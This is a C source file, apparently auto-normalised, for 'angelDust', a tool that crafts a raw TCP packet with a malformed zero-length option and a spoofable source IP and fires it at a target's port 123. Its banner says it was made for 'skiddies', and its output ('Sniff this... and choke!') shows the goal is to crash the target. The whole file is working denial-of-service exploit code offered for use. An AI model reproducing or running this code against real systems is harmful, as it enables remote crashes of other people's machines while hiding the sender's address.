#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct tcphdr {int doff; int window; scalar_t__ urg_ptr; scalar_t__ check; scalar_t__ syn; scalar_t__ res1; scalar_t__ ack; scalar_t__ seq; void* dest; void* source; } ;
struct TYPE_5__ {void* s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_2__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int /*<<< orphan*/ * member_2; } ;
struct TYPE_6__ {void* s_addr; } ;
struct TYPE_4__ {void* s_addr; } ;
struct ip {int ip_hl; int ip_v; int ip_ttl; int ip_len; TYPE_3__ ip_src; TYPE_1__ ip_dst; scalar_t__ ip_sum; int /*<<< orphan*/  ip_p; scalar_t__ ip_off; scalar_t__ ip_id; scalar_t__ ip_tos; } ;
typedef  int /*<<< orphan*/  opts ;
typedef  int /*<<< orphan*/  datagram ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*) ; 
 int getopt_long (int,char**,char const* const,struct option const*,int /*<<< orphan*/ *) ; 
 void* htons (int) ; 
 void* inet_addr (char*) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char**,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printUsage () ; 
 int /*<<< orphan*/  printf (char*) ; 
 int sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 
 int /*<<< orphan*/ * strstr (char*,char*) ; 

int main(int argc, char **argv) 
{ 
int s; 
int next_opt; 
const char* const short_opts="hD:S:"; 
//either one there both not valid protocol 
//char opts[] = "\x02\04\xff\xff"; 
char opts[] = "\x06\00\xff\xff"; 

char datagram[64]; 
struct sockaddr_in addr; 
struct ip *ip = (struct ip *) datagram; 
struct tcphdr *tcp; 
char dst_ip[16]; 
char src_ip[16]; 
#ifdef BINARYBETA 
if(strstr (argv[0],"/angelDust") == NULL) 
{ 
printf("Cmon you stupid llama, put the original name back\n"); 
exit(-1); 
} 
#endif 

if(argc < 2) 
{ 
printf("angelDust by Antimatt3r\n"); 
printf("pr0ps to Marcin for finding this bug\n"); 
printf("pr0ps to me for making something useful out of it for the skiddies\n"); 
exit(-1); 
} 


const struct option long_opts[]= 
{ 
{"help", 0, NULL,'h'}, 
{"destination_ip",1,NULL,'D'}, 
{"source_ip",1,NULL,'S'}, 
}; 

strncpy(dst_ip,"127.0.0.1",16); 
strncpy(src_ip,"127.0.0.1",16); 

do 
{ 
next_opt = getopt_long(argc,argv,short_opts,long_opts,NULL); 
switch( next_opt) 
{ 
case 'h' : 
printUsage(); 
return 0; 
case 'D' : 
strncpy(dst_ip,optarg,16); 
break; 
case 'S' : 
strncpy(src_ip,optarg,16); 
break; 

} 
} 
while(next_opt != -1) ; 


memset(&datagram, 0, sizeof(datagram)); 
addr.sin_addr.s_addr = inet_addr(dst_ip); 
addr.sin_port = htons(123); 
addr.sin_family = AF_INET; 

ip->ip_hl = 5; 
ip->ip_v = 4; 
ip->ip_tos = 0; 
ip->ip_id = 0; 
ip->ip_off = 0; 
ip->ip_ttl = 64; 
ip->ip_p = IPPROTO_TCP; 
ip->ip_len = 44; 
ip->ip_sum = 0; 
ip->ip_dst.s_addr = addr.sin_addr.s_addr; 
ip->ip_src.s_addr = inet_addr(src_ip); 

tcp = (struct tcphdr *) (datagram + (ip->ip_hl << 2)); 
tcp->source = htons(321); 
tcp->dest = addr.sin_port; 
tcp->seq = 0; 
tcp->ack = 0; 
tcp->res1 = 0; 
tcp->doff = 6; 
tcp->syn = 0; 
tcp->window = 0x1000; 
tcp->check = 0; 
tcp->urg_ptr = 0; 

memcpy(datagram + 40, opts, sizeof(opts)); 

if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) { 
perror("socket"); 
exit(0); 
} 

if (sendto(s, datagram, ip->ip_len, 0, (struct sockaddr *) &addr, 
sizeof(struct sockaddr_in)) == -1) { 
perror("sendto"); 
exit(-1); 
} 
fprintf(stderr,"Sniff this\n"); 
fprintf(stderr,"..............//"); 
sleep(1); 
fprintf(stderr,"\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b\b\b// "); 
sleep(1); 
fprintf(stderr,"\b\b\b\b\b\b\b\b\b\b\b\b// \n"); 
printf("and choke!\n"); 

close(s); 
return 0; 
}